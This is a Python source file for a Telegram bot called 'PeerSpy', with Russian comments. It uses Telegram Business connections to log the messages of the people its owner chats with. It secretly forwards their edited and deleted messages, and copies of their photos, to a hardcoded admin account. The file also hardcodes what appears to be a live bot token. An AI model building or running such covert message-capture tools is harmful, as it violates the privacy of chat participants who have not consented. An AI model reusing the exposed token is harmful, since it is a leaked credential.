import os
import asyncio
import aiohttp
import logging
import sqlite3
from flask import Flask
from threading import Thread
from aiogram import Bot, Dispatcher, types
from aiogram.types import Update

# --- КОНФИГ (ПРОВЕРЬ ТОКЕН!) ---
TOKEN = "8758417597:AAGJgDZWLjjfsF0YL9hHQDLCGkcgOVO5Q1o"
ADMIN_ID = 6451702799 

# --- БАЗА ДАННЫХ ---
def init_db():
    conn = sqlite3.connect('bot_data.db')
    cur = conn.cursor()
    cur.execute('''CREATE TABLE IF NOT EXISTS messages (msg_id TEXT PRIMARY KEY, text TEXT)''')
    conn.commit()
    conn.close()

# --- СЕРВЕР ---
app = Flask('')
@app.route('/')
def home(): return "PeerSpy Professional Is Running"

def run_web():
    app.run(host='0.0.0.0', port=os.environ.get("PORT", 8080))

# --- ЯДРО БОТА ---
bot = Bot(token=TOKEN)
dp = Dispatcher()

@dp.update()
async def process_update(update: Update):
    conn = sqlite3.connect('bot_data.db')
    cur = conn.cursor()
    
    try:
        # 1. ОБРАБОТКА БИЗНЕС-СООБЩЕНИЙ (НОВЫЕ И ПРАВКИ)
        biz_msg = update.business_message or update.edited_business_message
        
        if biz_msg:
            m_id = str(biz_msg.message_id)
            txt = biz_msg.text or biz_msg.caption or "[Медиа]"
            
            # Проверка на правку
            cur.execute("SELECT text FROM messages WHERE msg_id=?", (m_id,))
            old = cur.fetchone()
            if old and old[0] != txt:
                await bot.send_message(ADMIN_ID, f"✏️ <b>ИЗМЕНЕНО</b>\n───\n<b>Было:</b> {old[0]}\n<b>Стало:</b> {txt}", parse_mode="HTML")
            
            cur.execute("INSERT OR REPLACE INTO messages VALUES (?, ?)", (m_id, txt))
            conn.commit()

            # Сохранение фото
            if biz_msg.photo:
                f_id = biz_msg.photo[-1].file_id
                file = await bot.get_file(f_id)
                photo_url = f"https://api.telegram.org/file/bot{TOKEN}/{file.file_path}"
                async with aiohttp.ClientSession() as s:
                    async with s.get(photo_url) as r:
                        if r.status == 200:
                            await bot.send_photo(ADMIN_ID, types.BufferedInputFile(await r.read(), filename="spy.jpg"), caption="📸 <b>Медиа сохранено</b>")

        # 2. ОБРАБОТКА УДАЛЕНИЙ
        elif update.business_deleted_messages:
            for m_id in update.business_deleted_messages.message_ids:
                cur.execute("SELECT text FROM messages WHERE msg_id=?", (str(m_id),))
                res = cur.fetchone()
                if res:
                    await bot.send_message(ADMIN_ID, f"🗑 <b>УДАЛЕНО</b>\n───\n{res[0]}", parse_mode="HTML")

        # 3. ОБЫЧНЫЙ СТАРТ
        elif update.message and update.message.text == "/start":
            await update.message.answer("🚀 <b>PeerSpy v5.5 Professional</b>\nСистема мониторинга готова.")

    except Exception as e:
        logging.error(f"Ошибка при обработке: {e}")
    finally:
        conn.close()

async def main():
    init_db()
    Thread(target=run_web).start()
    logging.info("Бот запущен и ожидает обновлений...")
    # Принудительно запрашиваем ВСЕ типы данных у Telegram
    await dp.start_polling(bot, allowed_updates=["message", "business_message", "edited_business_message", "business_deleted_messages"])

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    asyncio.run(main())
